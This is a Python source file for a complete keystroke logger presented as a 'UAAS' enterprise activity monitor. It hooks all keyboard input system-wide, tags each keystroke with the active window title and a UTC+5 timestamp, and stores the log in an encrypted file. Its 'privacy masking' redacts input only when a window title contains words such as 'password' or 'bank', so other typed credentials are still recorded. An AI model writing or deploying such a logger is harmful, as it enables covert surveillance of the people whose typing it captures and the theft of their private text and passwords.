import json
import os
import threading
import time
from datetime import datetime, timezone, timedelta  # Added timedelta for timezone offset
from pathlib import Path

import keyboard  # Low-level native Windows hooking library
import pygetwindow as gw
from cryptography.fernet import Fernet

# --- Configuration ---
CONFIG = {
    "LOG_DIR": "uaas_data",
    "LOG_FILE_NAME": "activity_log.enc",
    "FLUSH_INTERVAL_SECONDS": 60,
    "FLUSH_THRESHOLD_CHARS": 500,
    "KEY_FILE": "fernet.key"
}

# --- State ---
buffer_lock = threading.Lock()
char_count = 0
buffer = []  # List of dicts: {timestamp, window, text}


class EventBuffer:
    """
    Manages the in-memory buffer and handles encrypted disk flushing.
    """
    def __init__(self):
        self._setup_storage()
        self._init_crypto()
        # Start the background periodic flush thread
        self._flush_thread = threading.Thread(target=self._flush_loop, daemon=True)
        self._flush_thread.start()

    def _setup_storage(self):
        """Ensures the log directory exists with restricted permissions."""
        log_dir = Path(CONFIG["LOG_DIR"])
        log_dir.mkdir(exist_ok=True)
        
        # Restrict directory access on Unix environments (Owner read/write/execute only)
        if os.name == 'posix':
            os.chmod(log_dir, 0o700)
            
        self.log_path = log_dir / CONFIG["LOG_FILE_NAME"]

    def _init_crypto(self):
        """Initializes or generates the Fernet encryption key."""
        key_file = Path(CONFIG["LOG_DIR"]) / CONFIG["KEY_FILE"]
        
        if key_file.exists():
            encryption_key = key_file.read_bytes()
        else:
            encryption_key = Fernet.generate_key()
            key_file.write_bytes(encryption_key)
            if os.name == 'posix':
                os.chmod(key_file, 0o600)  # Owner read/write only
            
        self.cipher = Fernet(encryption_key)

    def add_event(self, text: str):
        """Adds a keystroke event to the buffer with Pakistan Standard Time (UTC+5). Thread-safe."""
        global char_count, buffer
        if not text:
            return

        # Capture current active window title safely
        try:
            active_window = gw.getActiveWindow()
            window_title = active_window.title if active_window else "Unknown"
        except Exception:
            window_title = "Error/None"

        # --- PAKISTAN STANDARD TIME BINDING ---
        # Establish a static UTC+5 zone offset engine
        pkt_timezone = timezone(timedelta(hours=5))
        current_pkt_time = datetime.now(pkt_timezone).isoformat()

        with buffer_lock:
            buffer.append({
                "timestamp": current_pkt_time,
                "window": window_title,
                "text": text
            })
            char_count += len(text)
            
            # Proactively trigger flush if character volume threshold is crossed
            if char_count >= CONFIG["FLUSH_THRESHOLD_CHARS"]:
                self.flush_to_disk()

    def flush_to_disk(self):
        """Flushes buffered memory tracking logs atomically into encrypted storage."""
        global char_count, buffer
        
        with buffer_lock:
            if not buffer:
                return
            events_to_write = list(buffer)
            buffer.clear()
            char_count = 0

        try:
            existing_data = []
            # Read and decrypt existing data to append chronologically
            if self.log_path.exists() and self.log_path.stat().st_size > 0:
                try:
                    encrypted_content = self.log_path.read_bytes()
                    decrypted_content = self.cipher.decrypt(encrypted_content)
                    existing_data = json.loads(decrypted_content.decode('utf-8'))
                except Exception:
                    # In case of corruption or key mismatch, isolate corrupted file
                    corrupt_path = self.log_path.with_suffix('.corrupt')
                    os.rename(self.log_path, corrupt_path)
                    existing_data = []

            # Combine old logs with current buffer block
            existing_data.extend(events_to_write)
            serialized_payload = json.dumps(existing_data).encode('utf-8')
            encrypted_payload = self.cipher.encrypt(serialized_payload)

            # Atomic Write implementation using a temporary file wrapper
            temp_file_path = self.log_path.with_suffix('.tmp')
            temp_file_path.write_bytes(encrypted_payload)
            if os.name == 'posix':
                os.chmod(temp_file_path, 0o600)
            
            # Atomic swap ensures zero data destruction if power fails mid-write
            os.replace(temp_file_path, self.log_path)
            
        except Exception as e:
            print(f"[!] Critical Error flushing logging matrix: {e}")

    def _flush_loop(self):
        """Timed background thread worker that flushes data periodically."""
        while True:
            time.sleep(CONFIG["FLUSH_INTERVAL_SECONDS"])
            self.flush_to_disk()


# --- Hook Processing Pipeline ---
buffer_engine = EventBuffer()

def on_press(event):
    """Callback for the 'keyboard' library listener handling input telemetry safely."""
    try:
        # Ignore key-up/release events so characters don't print twice
        if event.event_type == keyboard.KEY_UP:
            return

        # Fetch active application window title context
        try:
            active_window = gw.getActiveWindow()
            window_title = active_window.title.lower() if active_window else ""
        except Exception:
            window_title = ""

        # --- DATA FILTERING / PASSWORD-MASKING PRIVACY RULES ---
        sensitive_keywords = ["password", "login", "signin", "bitwarden", "1password", "bank", "credit card"]
        
        if any(keyword in window_title for keyword in sensitive_keywords):
            buffer_engine.add_event("[REDACTED SENSITIVE INPUT] ")
            return

        # Process normal non-sensitive data strings
        if event.scan_code and event.name:
            if len(event.name) == 1 and event.name.isprintable():
                buffer_engine.add_event(event.name)
            else:
                special_map = {
                    'enter': '[ENTER]\n',
                    'space': ' ',
                    'tab': '\t',
                    'backspace': '[BACKSPACE]',
                    'esc': '[ESC]',
                    'up': '[UP]',
                    'down': '[DOWN]',
                    'left': '[LEFT]',
                    'right': '[RIGHT]',
                }
                if event.name in special_map:
                    buffer_engine.add_event(special_map[event.name])
                else:
                    buffer_engine.add_event(f"[{event.name.upper()}]")
    except Exception as e:
        print(f"Error in key listener: {e}")

def main():
    """Starts the primary collection module."""
    print("Starting UAAS Keyboard Listener (keyboard lib)...")
    print("[!] Enterprise Privacy Masking Engine Engaged.")
    print("[!] System Telemetry Bound to Pakistan Standard Time (UTC+5).")
    
    # Register global OS-level hook listeners (Requires Administrator Command Prompt)
    keyboard.hook(on_press, suppress=False)
    print("Listener active. Press Ctrl+C to stop safely.")
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[-] Detaching active audit listener architecture...")
        keyboard.unhook(on_press)
        buffer_engine.flush_to_disk()

if __name__ == "__main__":
    main()
